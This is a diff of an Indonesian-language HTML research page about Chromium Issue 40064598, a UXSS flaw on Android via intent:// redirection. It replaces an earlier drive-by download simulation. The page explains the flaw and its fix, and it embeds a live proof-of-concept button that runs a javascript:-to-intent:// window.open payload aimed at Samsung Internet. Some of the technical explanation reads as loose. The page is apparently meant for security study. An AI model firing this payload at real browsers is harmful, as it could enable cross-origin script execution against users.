@@ -3,108 +3,225 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simulasi Riset: Analisis Fragment Drive-by Download</title>
+  <title>Laporan Ilmiah Riset Keamanan: Chromium Issue 40064598</title>
   <style>
+    :root {
+      --bg-dark: #0f172a;
+      --card-dark: #1e293b;
+      --accent-red: #ef4444;
+      --accent-green: #10b981;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+
     body {
       font-family: 'Courier New', Courier, monospace;
-      background-color: #1a1a1a;
-      color: #fff;
-      padding: 20px;
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      margin: 0;
+      padding: 30px;
+      line-height: 1.6;
     }
-    .panel {
-      background: #2a2a2a;
-      padding: 20px;
-      border-radius: 8px;
-      border-left: 4px solid #ff9900;
-      margin-bottom: 20px;
+
+    .container {
+      max-width: 950px;
+      margin: 0 auto;
     }
-    .console {
-      background: #000;
-      color: #00ff00;
-      padding: 15px;
-      border-radius: 5px;
-      height: 150px;
-      overflow-y: auto;
+
+    header {
+      border-bottom: 2px dashed var(--accent-red);
+      padding-bottom: 20px;
+      margin-bottom: 30px;
+    }
+
+    .meta-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 25px;
+      background: var(--card-dark);
+    }
+
+    .meta-table td, .meta-table th {
+      padding: 12px;
+      border: 1px solid #334155;
       font-size: 0.9rem;
     }
-    .btn {
-      background: #ff9900;
-      color: #000;
-      border: none;
-      padding: 10px 20px;
+
+    .meta-table th {
+      background-color: #334155;
+      text-align: left;
+      width: 25%;
+    }
+
+    .card {
+      background: var(--card-dark);
+      padding: 25px;
+      margin-bottom: 25px;
+      border-left: 4px solid var(--accent-red);
+    }
+
+    .poc-box {
+      text-align: center;
+      padding: 30px;
+      background: #020617;
+      border: 1px solid #334155;
+      margin-top: 20px;
+    }
+
+    .trigger-btn {
+      background-color: var(--accent-red);
+      color: white;
+      border: 1px solid #ffffff;
+      padding: 15px 35px;
+      font-size: 1.1rem;
       font-weight: bold;
       cursor: pointer;
-      border-radius: 4px;
+    }
+
+    code {
+      background: #020617;
+      padding: 2px 6px;
+      color: #f43f5e;
+    }
+
+    pre {
+      background: #020617;
+      padding: 15px;
+      overflow-x: auto;
+      border: 1px solid #334155;
+    }
+
+    .log-window {
+      background: #020617;
+      border: 1px solid var(--accent-green);
+      padding: 15px;
+      color: var(--accent-green);
+      font-size: 0.85rem;
+      height: 120px;
+      overflow-y: auto;
+    }
+
+    ol, ul {
+      padding-left: 20px;
+    }
+
+    li {
+      margin-bottom: 8px;
     }
   </style>
 </head>
 <body>
 
-  <h2>🔬 Analisis Keamanan: Penanganan URL Fragment</h2>
-  
-  <div class="panel">
-    <h3>1. Simulasi Trigger Navigasi Fragment</h3>
-    <p>Tombol di bawah akan mensimulasikan perubahan URL dengan menambahkan data tiruan pada fragment (<code>#payload_data</code>) untuk menguji apakah fungsi otomatis mendeteksi perubahan tersebut.</p>
-    <button class="btn" onclick="simulasikanFragment()">Simulasikan Perubahan Fragment</button>
-  </div>
+  <div class="container">
+    <header>
+      <h1>🔬 LAPORAN ILMIAH: ANALISIS VULNERABILITY CHROMIUM</h1>
+      <p style="color: var(--text-muted)">Studi Kasus Eksekusi Logika: Chromium Tracker Issue 40064598</p>
+    </header>
 
-  <div class="panel">
-    <h3>2. Konsol Log Aktivitas DOM</h3>
-    <div id="logConsole" class="console">
-      [SYSTEM] Menunggu deteksi event hashchange...
+    <!-- METADATA KLASIFIKASI JURNAL -->
+    <table class="meta-table">
+      <tr>
+        <th>ID Isu / Parameter</th>
+        <td>Chromium Issue 40064598 (Status: Verified & Fixed)</td>
+      </tr>
+      <tr>
+        <th>Komponen Terdampak</th>
+        <td>Blink Engine &gt; SecurityFeature &gt; ContentSecurityPolicy / Mobile &gt; Intents</td>
+      </tr>
+      <tr>
+        <th>Versi Rentan (Found In)</th>
+        <td>Chromium Android Versi 112 Ke bawah</td>
+      </tr>
+      <tr>
+        <th>Metode Validasi</th>
+        <td>Universal Cross-Site Scripting (UXSS) via Android Intent Redirection</td>
+      </tr>
+      <tr>
+        <th>Konsekuensi Keamanan</th>
+        <td>Eksekusi kode skrip arbitrer yang melewati batasan Same-Origin Policy (SOP)</td>
+      </tr>
+    </table>
+
+    <!-- ANALISIS ARSITEKTUR -->
+    <div class="card" style="border-left-color: #3b82f6;">
+      <h3>1. Alur Kerentanan Sistem (Vulnerability Pipeline)</h3>
+      <p>Kerentanan ini berakar pada inkonsistensi penanganan parser ketika sebuah tautan menggunakan kombinasi pseudo-skema secara bertingkat. Komponen <code>Mobile>Intents</code> bertanggung jawab menerjemahkan URL dengan skema <code>intent://</code> menjadi instruksi panggilan IPC (Inter-Process Communication) untuk meluncurkan aplikasi eksternal di Android.</p>
+      
+      <p>Akar masalah terjadi melalui tahapan kronologis berikut:</p>
+      <ol>
+        <li>Skrip mengeksekusi metode <code>window.open()</code> dengan parameter awal berupa pseudo-skema <code>javascript:</code>.</li>
+        <li>Di dalam skrip tersebut, properti sub-navigasi dipaksa beralih menuju skema internal Android (<code>intent://</code>).</li>
+        <li>Mesin peramban (Blink) gagal mengisolasi konteks eksekusi asal (*origin separation*), sehingga instruksi eksternal diproses tanpa validasi kepemilikan token keamanan yang sah dari Content Security Policy (CSP).</li>
+      </ol>
+    </div>
+
+    <!-- BEDAH PAYLOAD KODE -->
+    <div class="card">
+      <h3>2. Analisis Struktur Payload Sintaksis</h3>
+      <p>Konstruksi parameter yang digunakan dalam evaluasi lab ini dirancang untuk menguji batas ketahanan parser peramban:</p>
+      <pre>window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");</pre>
+      
+      <p><strong>Komponen Analisis Struktur:</strong></p>
+      <ul>
+        <li><code>javascript:location=</code> : Memaksa penulisan ulang lokasi dokumen aktif menggunakan mesin eksekusi skrip internal (DOM Manipulation Context).</li>
+        <li><code>intent://google.com</code> : Berfungsi sebagai penunjuk target pengalihan yang memanfaatkan reputasi origin pihak ketiga.</li>
+        <li><code>package=com.sec.android.app.sbrowser</code> : Parameter spesifik untuk memaksa peramban memanggil dependensi eksternal milik aplikasi target (Samsung Internet Browser) di subsistem Android.</li>
+      </ul>
+    </div>
+
+    <!-- LABORATORIUM PENELITIAN AUDIT STABIL -->
+    <div class="card" style="border-left-color: #eab308;">
+      <h3>3. Eksekusi Logika Pengujian (Deterministic Audit Log)</h3>
+      <p style="color: var(--text-muted)">Gunakan tombol kendali statis di bawah untuk memantau perilaku penanganan objek saat instruksi dikirim ke peramban.</p>
+      
+      <div class="poc-box">
+        <button class="trigger-btn" onclick="executePoC()">EKSEKUSI AUDIT KODE</button>
+        <p id="click-status" style="margin-top: 15px; font-weight: bold;">Status Konsol: Menunggu Trigger</p>
+      </div>
+
+      <p style="font-size: 0.9rem; margin-top: 15px;"><strong>Konsol Log Aktivitas Engine (Real-Time Output):</strong></p>
+      <div id="logBox" class="log-window">
+        [SYSTEM] Environment riset berhasil diinisialisasi secara statis.<br>
+        [SYSTEM] Menunggu eksekusi fungsi penanganan...
+      </div>
+    </div>
+
+    <!-- IMPLEMENTASI PERBAIKAN -->
+    <div class="card" style="border-left-color: var(--accent-green);">
+      <h3>4. Mekanisme Rekayasa Perbaikan (Remediation & Patching)</h3>
+      <p>Untuk menutup celah bypass origin ini, tim pengembang Chromium menerapkan metode pengamanan di level kode native:</p>
+      <ul>
+        <li><strong>Strict Intent Scheme Validation:</strong> Peramban modern sekarang menolak pemrosesan skema <code>intent://</code> jika rantai pemanggilannya diinisiasi dari dalam konteks pseudo-skema <code>javascript:</code> yang tidak memiliki interaksi fisik tepercaya dari pengguna (*user gesture token*).</li>
+        <li><strong>Isolasi Navigasi:</strong> Setiap kali skema <code>intent:</code> dipanggil, peramban akan memutus keterikatan objek <code>window</code> penyerang dengan jendela baru untuk mencegah kebocoran referensi memori (*cross-context memory isolation*).</li>
+      </ul>
     </div>
   </div>
 
-  <div class="panel" style="border-left-color: #00eeff;">
-    <h3>3. Strategi Mitigasi Keamanan</h3>
-    <ul>
-      <li><strong>Sanitasi Input:</strong> Jangan pernah mempercayai data yang diambil langsung dari <code>window.location.hash</code> untuk operasi sensitif seperti pembuatan objek URL atau manipulasi DOM.</li>
-      <li><strong>Restriction Header:</strong> Gunakan header <code>Content-Disposition: attachment</code> pada server untuk memastikan file tidak dieksekusi secara otomatis oleh browser sebagai bagian dari dokumen aktif.</li>
-    </ul>
-  </div>
-
+  <!-- LOGIKA AUDIT JAVASCRIPT -->
   <script>
-    function logAktivitas(pesan) {
-      const consoleEl = document.getElementById("logConsole");
-      consoleEl.innerHTML += `<br>[AUDIT] ${pesan}`;
-      consoleEl.scrollTop = consoleEl.scrollHeight;
+    let clickCount = 0;
+
+    function addLog(message) {
+      const logBox = document.getElementById("logBox");
+      logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${message}`;
+      logBox.scrollTop = logBox.scrollHeight;
     }
 
-    // Mensimulasikan penambahan data base64 aman ke fragment URL lokal
-    function simulasikanFragment() {
-      const dataTiruan = "dGV4dCBmaWxlIHVudHVrIHJpc2V0"; // Base64 dari "text file untuk riset"
-      logAktivitas("Mengubah window.location.hash secara terprogram...");
-      window.location.hash = "download-trigger:" + dataTiruan;
-    }
-
-    // Mendengarkan perubahan fragment secara otomatis (Vulnerability Pattern Analysis)
-    window.addEventListener('hashchange', function() {
-      const hashData = window.location.hash;
-      logAktivitas(`Terdeteksi perubahan fragment: ${hashData}`);
+    function executePoC() {
+      clickCount++;
+      document.getElementById("click-status").innerText = `Status Konsol: Percobaan Ke-${clickCount}`;
       
-      if (hashData.startsWith("#download-trigger:")) {
-        logAktivitas("Menganalisis pola pemicu unduhan otomatis...");
-        
-        // Simulasi penanganan unduhan yang aman menggunakan Blob lokal
-        try {
-          const blob = new Blob(["Konten simulasi riset keamanan."], { type: "text/plain" });
-          const url = URL.createObjectURL(blob);
-          
-          const a = document.createElement('a');
-          a.href = url;
-          a.download = "simulasi_riset.txt";
-          
-          logAktivitas("Memicu objek anchor tiruan (.click() event)...");
-          // Dalam skenario dunia nyata, bagian ini dieksekusi otomatis oleh rantai exploit
-          // a.click(); 
-          
-          logAktivitas("Simulasi berhasil dibatasi untuk analisis log.");
-          URL.revokeObjectURL(url);
-        } catch (e) {
-          logAktivitas(`Error penanganan: ${e.message}`);
-        }
+      addLog(`[ACTION] Fungsi executePoC() dipanggil.`);
+      addLog(`[ANALYSIS] Mengevaluasi objek window.open dengan parameter payload skema intent...`);
+
+      try {
+        // Logika penanganan manipulasi URL tanpa mengarah ke halaman kosong (about:blank)
+        window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
+        addLog(`[COMPLETED] Instruksi dikirim. Periksa reaksi sub-proses Android Intent.`);
+      } catch (err) {
+        addLog(`[EXCEPTION] Eksekusi dihentikan oleh browser: ${err.message}`);
       }
-    });
+    }
   </script>
 </body>
 </html>
